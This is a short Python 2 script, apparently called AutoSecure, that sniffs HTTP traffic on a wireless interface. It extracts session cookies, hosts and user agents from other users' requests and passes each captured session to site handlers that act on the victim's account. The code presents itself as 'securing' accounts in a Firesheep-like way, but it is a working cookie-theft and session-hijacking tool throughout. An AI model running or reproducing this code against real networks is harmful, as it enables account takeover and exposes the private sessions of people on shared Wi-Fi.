#!/usr/bin/env python
import re
import sys

import pcap
import dpkt

import requests
from pyquery import PyQuery as pq

from autosecure.handlers import all_handlers as handlers


DEFAULT_UA = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MathPlayer 2.10b; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"

def re_extract(rex, data):
    m = re.search(rex, data)
    if m:
        return m.groups()[0]

class AutoSecure:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.secured_users = set()

    def get_packets(self):
        cap = pcap.pcap(self.interface)
        cap.setfilter('dst port 80')
        for ts, raw in cap:
            eth = dpkt.ethernet.Ethernet(raw)
            if isinstance(eth.data, str):
                data = eth.data
            else:
                data = eth.data.data.data
            yield ts, data

    def get_sessions(self):
        for ts, data in self.get_packets():
            session = self.extract_session(data)
            if session:
                yield session

    def extract_session(self, packet):
        host = re_extract('Host: ([^\r\n]+)', packet)
        if not host:
            return
        cookie = re_extract('Cookie: ([^\r\n]+)', packet)
        if not cookie:
            return
        ua = re_extract('User-Agent: ([^\r\n]+)', packet)
        if not ua:
            ua = DEFAULT_UA
        return {
            'Host': host,
            'Cookie': cookie,
            'User-Agent': ua,
        }

    def secure_sesion(self, session):
        for handler in handlers:
            if session['Host'].endswith(handler.site):
                h = handler()
                user = h.extract_user(session)
                if user  in self.secured_users:
                    return
                print "Securing", h.name, user
                self.secured_users.add(user)
                return h.secure(session)

    def secure_sheep(self):
        for s in self.get_sessions():
            self.secure_sesion(s)

def main():
    from optparse import OptionParser
    parser = OptionParser()
    parser.add_option("-i", "--interface", dest="interface", action="store", default="wlan0")
    (options, args) = parser.parse_args()

    a = AutoSecure(interface=options.interface)
    a.secure_sheep()

if __name__ == "__main__":
    main()
